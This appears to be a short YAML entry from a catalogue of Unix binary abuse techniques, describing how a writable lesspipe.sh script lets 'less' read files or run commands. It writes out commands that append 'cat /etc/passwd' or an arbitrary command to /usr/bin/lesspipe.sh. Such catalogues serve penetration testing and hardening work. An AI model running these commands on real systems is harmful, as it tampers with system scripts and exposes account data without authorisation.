---
functions:
  file-read:
    - description: |
        This can read files by modifying the system lesspipe script if writable.
      code: |
        echo 'cat /etc/passwd' >> /usr/bin/lesspipe.sh
        less anyfile
  
  command:
    - description: |
        This executes commands if the lesspipe script is writable.
      code: |
        echo 'COMMAND' >> /usr/bin/lesspipe.sh
        less anyfile
---

